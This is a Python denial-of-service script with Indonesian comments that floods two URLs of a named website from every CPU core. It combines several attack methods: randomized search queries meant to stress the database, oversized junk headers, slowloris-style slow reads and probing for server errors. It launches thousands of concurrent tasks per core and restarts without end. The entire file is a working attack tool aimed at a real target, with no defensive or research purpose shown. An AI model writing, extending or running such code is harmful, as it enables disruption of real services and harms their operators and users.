import asyncio
import aiohttp
import random
import string
import multiprocessing
import socket

# --- TARGETS ---
TARGETS = ["https://ingatcuan88.pro/", "https://ingatcuan88.pro/amp/"]

def rs(l=20): return ''.join(random.choices(string.ascii_letters + string.digits, k=l))

# --- SEMUA VECTOR DARI FILE LU ---

# 1. DB STRESS (ddos.py & ddosms.py)
async def v_db(s, t):
    url = f"{t}?s={rs(15)}"
    async with s.get(url, timeout=10) as r: await r.content.read(1)

# 2. JUGGERNAUT / HEADER BLOATING (ddos1.py)
async def v_jug(s, t):
    h = {"Large-Trash-Header": "X" * 2048, "Cookie": f"s={rs(40)}"}
    async with s.get(t, headers=h, timeout=10) as r: await r.content.read(1)

# 3. SILENT KILLER / SLOWLORIS (ddos2.py)
async def v_silent(s, t):
    async with s.get(t, timeout=300) as r:
        while not r.content.at_eof():
            await r.content.read(1)
            await asyncio.sleep(15)

# 4. OVERLORD / 501 STRESSER (ddos501.py)
async def v_over(s, t):
    url = f"{t}?t={random.random()}"
    async with s.get(url, timeout=5) as r: 
        if r.status >= 500: print(f"[!] SERVER 5xx! -> {r.status}")

# 5. CLOUD CRACKER (ddosms1.py)
async def v_cloud(s, t):
    url = f"{t}?s={rs(30)}&cat={random.randint(1,999)}"
    async with s.get(url, timeout=15) as r: await r.content.read(10)

# --- THE MATRIX ENGINE ---
def start_engine(target_url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def run():
        # Connector paling agresif untuk 20 Core
        conn = aiohttp.TCPConnector(limit=0, ssl=False, use_dns_cache=True)
        async with aiohttp.ClientSession(connector=conn) as session:
            tasks = []
            # Setiap core bakal nge-spawn 2500 task campuran (Hybrid)
            for _ in range(500): tasks.append(v_db(session, target_url))
            for _ in range(500): tasks.append(v_jug(session, target_url))
            for _ in range(500): tasks.append(v_silent(session, target_url))
            for _ in range(500): tasks.append(v_over(session, target_url))
            for _ in range(500): tasks.append(v_cloud(session, target_url))
            
            print(f"[Core Active] Sending 2500 Hybrid Tasks...")
            await asyncio.gather(*tasks, return_exceptions=True)

    while True: # Auto-restart kalau loop beres
        try: loop.run_until_complete(run())
        except: pass

if __name__ == "__main__":
    print("🔱 THE OMNI-LEVIATHAN IS AWAKENED 🔱")
    print("Targeting: BOTH CHANNELS | Threads: Kenceng oii!")
    
    processes = []
    # PAKAI SEMUA 20 CORE LU!
    for i in range(multiprocessing.cpu_count()):
        # Bagi tugas: setengah core ke target 1, setengah ke target 2
        t_url = TARGETS[0] if i % 2 == 0 else TARGETS[1]
        p = multiprocessing.Process(target=start_engine, args=(t_url,))
        p.daemon = True
        p.start()
        processes.append(p)
        print(f"[+] Engine Core {i} Online -> {t_url}")
    
    try:
        for p in processes: p.join()
    except KeyboardInterrupt:
        print("\n[!] Total Annihilation Stopped.")
